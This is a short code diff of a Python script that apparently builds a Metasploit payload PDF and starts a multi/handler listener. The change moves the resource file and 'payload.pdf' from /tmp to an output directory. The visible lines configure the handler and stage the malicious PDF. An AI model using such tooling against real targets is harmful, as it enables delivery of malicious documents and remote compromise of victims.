@@ -19,7 +19,7 @@ def start_listener():
 	PrintInfo("Starting multi handler")
 
 	# create rc file
-	rcfile = "/tmp/pdf_listener.rc"
+	rcfile = "output/pdf_listener.rc"
 	fw = open(rcfile, "w")
 	fw.write("use exploit/multi/handler\n")
 	fw.write("set PAYLOAD %s\n" % payload2)
@@ -104,10 +104,10 @@ while 1:
 		
 		# moves file from ~/.msf4/local/ to /tmp 
 		# still need to figure out how to get filename sent to /tmp
-		shutil.move(os.getenv('HOME')+'/.msf4/local/payload.pdf','/tmp/payload.pdf')
+		shutil.move(os.getenv('HOME')+'/.msf4/local/payload.pdf','output/payload.pdf')
 		sleep(1)
 		
-		PrintInfo("payload.pdf is currently being moved to your /tmp directory.")
+		PrintInfo("payload.pdf is currently being moved to the output directory.")
 		sleep(1)
 		
 		# start multi/handler listener
